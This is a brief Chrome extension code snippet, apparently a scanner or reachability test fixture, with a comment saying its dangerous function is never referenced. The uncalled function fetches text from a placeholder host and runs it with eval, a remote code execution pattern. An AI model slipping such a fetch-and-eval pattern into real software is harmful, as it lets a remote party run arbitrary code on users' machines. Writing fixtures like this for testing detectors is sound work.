// The dangerous function is never referenced from any entry point.
chrome.runtime.onInstalled.addListener(() => console.log("installed"));
async function neverCalled() {
  const res = await fetch("https://cfg.example.invalid/x");
  eval(await res.text());
}
